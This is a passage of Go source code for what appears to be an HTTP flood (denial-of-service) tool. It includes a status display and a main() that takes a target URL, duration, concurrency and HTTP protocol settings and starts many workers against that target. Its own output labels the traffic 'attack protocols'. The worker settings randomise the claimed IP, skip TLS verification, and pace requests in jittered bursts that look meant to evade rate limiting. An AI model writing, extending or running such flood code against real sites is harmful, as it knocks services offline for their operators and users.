		sb.WriteString(statusOkColor.Sprintf("  %-20s %d\n", "Successful Resets:", success))
		sb.WriteString(statusErrColor.Sprintf("  %-20s %d\n", "Errors:", errors))
	}

	logMessagesMux.Lock()
	logs := make([]string, len(logMessages))
	copy(logs, logMessages)
	logMessagesMux.Unlock()
	sb.WriteString(headerColor.Sprint("---------------------------------------------------------------------------------------------------------------------------------------------------------------\n"))
	// MODIFIED: Changed log title from "5 events" to "3 events".
	sb.WriteString(headerColor.Sprint("Log (last 3 events):\n"))
	for i := len(logs) - 1; i >= 0; i-- {
		sb.WriteString(logs[i] + "\n")
	}
	fmt.Print(sb.String())
}

func statusString(enabled bool) string {
	if enabled {
		return valueColor.Sprint("Enabled")
	}
	return statusErrColor.Sprint("Disabled")
}

func main() {
	flag.Usage = func() {
		titleColor.Fprintf(color.Output, "Usage of %s:\n", os.Args[0])
		flag.PrintDefaults()
	}
	urlPtr := flag.String("url", "", "Target URL (e.g., https://example.com) (required)")
	portPtr := flag.String("port", "", "Target port (optional, overrides URL)")
	durationPtr := flag.Int("duration", 5, "Test duration in minutes")
	methodsPtr := flag.String("http-method", "GET,POST", "Comma-separated HTTP methods")
	httpProtocolPtr := flag.String("http-protocol", "", "Force specific HTTP protocols (e.g., \"1.1,2,3\"). If not set, auto-detects.")
	concurrencyPtr := flag.Int("concurrency", 100, "Total concurrent worker goroutines")
	pathRandPtr := flag.Bool("random-path", false, "Randomize request paths/queries")
	jitterPtr := flag.Int("jitter", 50, "Maximum jitter (ms) per request")
	burstSizePtr := flag.Int("burst-size", 15, "Max number of requests per worker burst")
	adaptiveDelayPtr := flag.Bool("adaptive-delay", false, "Enable adaptive delay to throttle requests based on server response")
	thinkTimePtr := flag.Int("think-time", 7000, "Max think time (ms) between bursts")
	burstPtr := flag.Bool("burst", true, "Enable Burst & Think mode")

	flag.Parse()
	if *urlPtr == "" {
		fmt.Println()
		statusErrColor.Println("Error: --url is required.")
		flag.Usage()
		return
	}
	finalURL := *urlPtr
	if !strings.HasPrefix(finalURL, "http") {
		finalURL = "https://" + finalURL
	}

	parsedURL, err := url.Parse(finalURL)
	if err != nil {
		statusErrColor.Printf("Error: Invalid URL provided: %v\n", err)
		return
	}
	if *portPtr != "" {
		host, _, err := net.SplitHostPort(parsedURL.Host)
		if err != nil {
			host = parsedURL.Host
		}
		parsedURL.Host = net.JoinHostPort(host, *portPtr)
		finalURL = parsedURL.String()
	}

	methods := strings.Split(*methodsPtr, ",")
	duration := time.Duration(*durationPtr) * time.Minute
	ctx, cancel := context.WithTimeout(context.Background(), duration)
	defer cancel()

	var supportedVersions []string

	if *httpProtocolPtr != "" {
		supportedVersions = strings.Split(*httpProtocolPtr, ",")
		for i, v := range supportedVersions {
			supportedVersions[i] = strings.TrimSpace(v)
		}
		fmt.Printf("Forcing attack protocols as specified: %s\n", strings.Join(supportedVersions, ", "))
	} else {
		fmt.Println("Detecting supported HTTP versions on target...")
		supportedVersions = detectSupportedHTTPVersions(finalURL, true)
		fmt.Printf("Attack protocols detected: %s\n", strings.Join(supportedVersions, ", "))
		time.Sleep(2 * time.Second)
	}

	config := &workerConfig{
		targetURL:         finalURL,
		methods:           methods,
		ipRandom:          true,
		pathRandom:        *pathRandPtr,
		retry:             true,
		burst:             *burstPtr,
		burstSize:         *burstSizePtr,
		jitterMs:          *jitterPtr,
		insecureTLS:       true,
		supportedVersions: supportedVersions,
		adaptiveDelay:     *adaptiveDelayPtr,
		thinkTimeMs:       *thinkTimePtr,
	}

	var wg sync.WaitGroup
	for i := 0; i < *concurrencyPtr; i++ {
		wg.Add(1)
		assignedVersion := supportedVersions[i%len(supportedVersions)]
		go worker(ctx, &wg, config, assignedVersion)
	}

	go monitor(ctx, duration, config)

	wg.Wait()
}
